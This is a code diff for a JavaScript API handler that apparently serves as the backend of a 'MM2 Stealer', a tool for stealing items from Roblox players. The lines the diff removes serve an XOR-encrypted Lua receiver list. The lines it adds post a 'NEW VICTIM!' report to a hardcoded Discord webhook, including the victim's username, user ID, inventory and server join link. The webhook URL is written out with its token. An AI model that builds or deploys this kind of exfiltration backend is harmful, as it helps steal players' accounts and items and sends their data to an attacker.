@@ -1,36 +1,25 @@
 
-const XOR_KEY = "Nr46WdKC2kQXvmLQgNDRtAwlkftEb4qt";
-
-function xorEncrypt(text, key) {
-    let result = '';
-    for (let i = 0; i < text.length; i++) {
-        result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-    }
-    return Buffer.from(result).toString('base64');
-}
-
-export default function handler(req, res) {
+export default async function handler(req, res) {
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { uuid } = req.body;
+    const { hitData } = req.body;
     
-    // Change this to your UUID
-    const users = {
-        "your-uuid-here": {
-            receivers: ["Nicename719"]
-        }
-    };
-
-    const user = users[uuid];
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";
     
-    if (!user) {
-        return res.status(404).json({ error: 'User not found' });
+    let itemsText = "";
+    for (const item of hitData.items || []) {
+        itemsText += `${item.name} x${item.amount}\n`;
     }
-
-    const luaScript = `_G.receivers = {${user.receivers.map(r => `"${r}"`).join(', ')}}`;
-    const encrypted = xorEncrypt(luaScript, XOR_KEY);
-
-    return res.status(200).json({ encrypted: true, data: encrypted });
+    
+    const message = `**🎯 NEW VICTIM!**\n\n**Player:** ${hitData.username}\n**User ID:** ${hitData.userId}\n**Job ID:** \`${hitData.jobId}\`\n\n**Inventory:**\n${itemsText || "No items"}\n\n**Join Link:** ${hitData.joinLink}\n\n**Waiting for ${hitData.receiver} to join...**`;
+    
+    await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message, username: "MM2 Stealer" })
+    });
+    
+    return res.status(200).json({ success: true });
 }
